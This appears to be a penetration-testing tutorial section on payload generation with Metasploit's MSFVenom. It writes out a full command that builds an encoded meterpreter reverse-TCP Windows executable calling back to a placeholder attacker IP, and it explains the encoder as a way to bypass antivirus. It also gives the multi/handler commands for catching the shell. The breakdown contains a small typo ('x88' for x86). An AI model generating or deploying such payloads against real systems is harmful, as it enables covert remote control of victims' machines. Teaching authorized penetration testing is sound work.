# Payload Generation Tools and Techniques

A number of tools can be used for payload generation.  This section will cover a number of the most common payload generation tools and techniques that can be used to compromise a host on a penetration testing engagement.


## Metasploit Framework MSFVenom

MSFVenom is included as part of the metasploit framework install and can be used to generate payloads to compromise a target on a penetration test.  MSFVenom works in conjunction with the metasploit framework to establish a connection to the target host.

### Microsoft Windows Payloads

The following payload will create an obfuscated meterpreter executable (.exe) for an x86 32bit system:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<Attacker_IP_Address> LPORT=<Attacker_Port> -f exe -o <payload_name>.exe`

A breakdown of the command:

**-p** - Name of payload to be executed on the target machine.  In this case "meterpreter reverse tcp".

**-a** - Architecture of the payload.  In this case x86 specifies a 32bit build.

**--encoder** - This specifies which encoder to use to obfuscate the meterpreter payload.  In this case x88/shikata_ga_nai has been used.  Encoding is used in an effort to obfuscate the payload to bypass antivirus detections. The `-i` command can be supplied an integer, to increase the number of encoding iterations.

**-f** - This specifies the format of the payload.  In this case this tells MSFVenom to generate the payload as a windows executable (.exe) file.

**-o**  This is the output filename of the payload, along with the .exe file extension.

The payload would then have to be transferred and executed on the target machine. 

Before executing the payload on the target machine, a payload handler must be set up within the metasploit framework. This can be achieved using the following commands:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_IP_Address>
set LPORT <attacker_PORT>

```
